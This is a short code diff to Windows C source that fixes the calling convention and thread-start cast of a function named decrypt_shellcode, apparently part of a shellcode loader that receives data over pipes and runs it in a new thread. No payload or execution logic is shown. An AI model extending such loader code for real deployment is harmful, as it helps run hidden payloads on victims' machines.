@@ -94,7 +94,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 	}
 }
 
-static uint32_t decrypt_shellcode(void* args) {
+static int __stdcall decrypt_shellcode(void* args) {
 	HANDLE* pipes = (HANDLE*)args;
 	uint32_t size = 0;
 	uint32_t nRead = 0;
@@ -204,7 +204,7 @@ void run(void) {
 	HANDLE thread = (HANDLE)_beginthreadex(
 		NULL,
 		0,
-		decrypt_shellcode,
+		(_beginthreadex_proc_type)decrypt_shellcode,
 		(void*)pipes,
 		0,
 		NULL
